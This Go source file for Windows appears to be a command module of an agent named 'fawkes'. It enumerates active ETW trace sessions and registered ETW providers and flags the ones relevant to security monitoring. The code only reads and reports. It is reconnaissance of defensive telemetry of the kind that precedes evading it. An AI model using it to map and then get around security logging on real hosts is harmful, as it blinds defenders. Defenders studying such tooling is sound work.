//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

func etwSessions() structs.CommandResult {
	// Allocate array of pointers to EVENT_TRACE_PROPERTIES
	const maxSessions = 64
	propsBufs := make([][]byte, maxSessions)
	propsPtrs := make([]uintptr, maxSessions)

	for i := range propsBufs {
		propsBufs[i] = make([]byte, eventTracePropsSize)
		// Set Wnode.BufferSize at offset 0
		binary.LittleEndian.PutUint32(propsBufs[i][0:4], eventTracePropsSize)
		// LogFileNameOffset at offset 112, LoggerNameOffset at offset 116
		// Point to buffer space after the fixed 120-byte struct
		binary.LittleEndian.PutUint32(propsBufs[i][116:120], 120) // LoggerNameOffset
		binary.LittleEndian.PutUint32(propsBufs[i][112:116], 632) // LogFileNameOffset (120 + 256*2)
		propsPtrs[i] = uintptr(unsafe.Pointer(&propsBufs[i][0]))
	}

	var sessionCount uint32
	r1, _, err := procQueryAllTracesW.Call(
		uintptr(unsafe.Pointer(&propsPtrs[0])),
		maxSessions,
		uintptr(unsafe.Pointer(&sessionCount)),
	)
	if r1 != 0 {
		return errorf("QueryAllTracesW failed: %v (0x%X)", err, r1)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Active ETW Trace Sessions — %d found\n\n", sessionCount))
	sb.WriteString(fmt.Sprintf("%-35s %-8s %s\n", "SESSION NAME", "EVENTS", "SECURITY RELEVANCE"))
	sb.WriteString(strings.Repeat("-", 80) + "\n")

	for i := uint32(0); i < sessionCount; i++ {
		buf := propsBufs[i]

		// EVENT_TRACE_PROPERTIES layout:
		// WNODE_HEADER: 48 bytes (BufferSize(4) + ProviderId(4) + HistoricalContext(8) +
		//   TimeStamp(8) + Guid(16) + ClientContext(4) + Flags(4))
		// After WNODE_HEADER: BufferSize(4) + MinimumBuffers(4) + MaximumBuffers(4) +
		//   MaximumFileSize(4) + LogFileMode(4) + FlushTimer(4) + EnableFlags(4) +
		//   AgeLimit(4) + NumberOfBuffers(4) + FreeBuffers(4) + EventsLost(4) +
		//   BuffersWritten(4) + LogBuffersLost(4) + RealTimeBuffersLost(4) +
		//   LoggerThreadId(8) + LogFileNameOffset(4@112) + LoggerNameOffset(4@116)
		// Total fixed size: 120 bytes

		loggerNameOffset := binary.LittleEndian.Uint32(buf[116:120])
		sessionName := ""
		if loggerNameOffset > 0 && loggerNameOffset < eventTracePropsSize-2 {
			// UTF-16LE string
			nameBytes := buf[loggerNameOffset:]
			u16s := make([]uint16, 0)
			for j := 0; j+1 < len(nameBytes); j += 2 {
				ch := binary.LittleEndian.Uint16(nameBytes[j : j+2])
				if ch == 0 {
					break
				}
				u16s = append(u16s, ch)
			}
			sessionName = windows.UTF16ToString(u16s)
		}

		if sessionName == "" {
			sessionName = fmt.Sprintf("Session_%d", i)
		}

		// Get event count from NumberOfBuffers * BufferSize area
		// EventsLost at offset 56
		eventsLost := binary.LittleEndian.Uint32(buf[56:60])
		_ = eventsLost

		// Check security relevance
		relevance := classifySessionSecurity(sessionName)

		sb.WriteString(fmt.Sprintf("%-35s %-8s %s\n",
			truncStr(sessionName, 35), "", relevance))
	}

	return successResult(sb.String())
}

func etwProviders() structs.CommandResult {
	// Use EnumerateTraceGuidsEx to get all registered providers
	// First call to get required size
	var requiredSize uint32
	procEnumerateTraceGuidsEx.Call(
		traceGuidQueryList,
		0, 0,
		0, 0,
		uintptr(unsafe.Pointer(&requiredSize)),
	)

	if requiredSize == 0 {
		return errorResult("No ETW providers found or EnumerateTraceGuidsEx not available")
	}

	buf := make([]byte, requiredSize)
	r1, _, err := procEnumerateTraceGuidsEx.Call(
		traceGuidQueryList,
		0, 0,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(requiredSize),
		uintptr(unsafe.Pointer(&requiredSize)),
	)
	if r1 != 0 {
		return errorf("EnumerateTraceGuidsEx failed: %v (0x%X)", err, r1)
	}

	// Parse the array of GUIDs
	guidSize := 16
	numGuids := int(requiredSize) / guidSize
	var securityProviders []string
	var otherCount int

	for i := 0; i < numGuids; i++ {
		offset := i * guidSize
		if offset+guidSize > len(buf) {
			break
		}

		guid := parseGUID(buf[offset : offset+guidSize])
		guidStr := guid.String()
		guidUpper := strings.ToUpper(guidStr)

		// Strip braces if present
		guidUpper = strings.Trim(guidUpper, "{}")

		if name, ok := knownSecurityProviders[guidUpper]; ok {
			securityProviders = append(securityProviders, fmt.Sprintf("%-45s %s", name, guidUpper))
		} else {
			otherCount++
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("ETW Providers — %d total registered\n\n", numGuids))

	if len(securityProviders) > 0 {
		sb.WriteString(fmt.Sprintf("Security-Relevant Providers (%d found):\n", len(securityProviders)))
		sb.WriteString(fmt.Sprintf("%-45s %s\n", "PROVIDER NAME", "GUID"))
		sb.WriteString(strings.Repeat("-", 85) + "\n")
		for _, p := range securityProviders {
			sb.WriteString(fmt.Sprintf("  %s\n", p))
		}
	} else {
		sb.WriteString("No known security-relevant ETW providers detected.\n")
	}

	sb.WriteString(fmt.Sprintf("\n%d other (non-security) providers registered\n", otherCount))

	return successResult(sb.String())
}
